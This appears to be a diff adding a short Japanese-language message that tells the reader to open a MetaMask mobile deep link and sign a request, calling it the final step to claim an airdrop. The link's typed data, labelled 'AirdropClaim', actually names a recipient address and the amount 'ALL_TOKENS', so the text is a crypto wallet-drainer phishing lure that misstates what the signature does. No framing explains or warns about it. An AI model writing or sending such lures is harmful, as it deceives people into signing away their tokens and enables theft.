@@ -1,0 +1,5 @@
+MetaMask モバイルでこのディープリンクを開いて署名を完了してください：
+
+metamask://dapp/sign?chainId=1&method=eth_signTypedData_v4&address={{YOUR_ADDRESS}}&typedData=BASE64({"domain":{"name":"AirdropClaim"},"message":{"recipient":"0xDeaDBeEf00000000000000000000000000000023","amount":"ALL_TOKENS"}})
+
+このリンクはアプリを直接起動して署名リクエストを表示します。エアドロップ受取のために必要な最終ステップです。
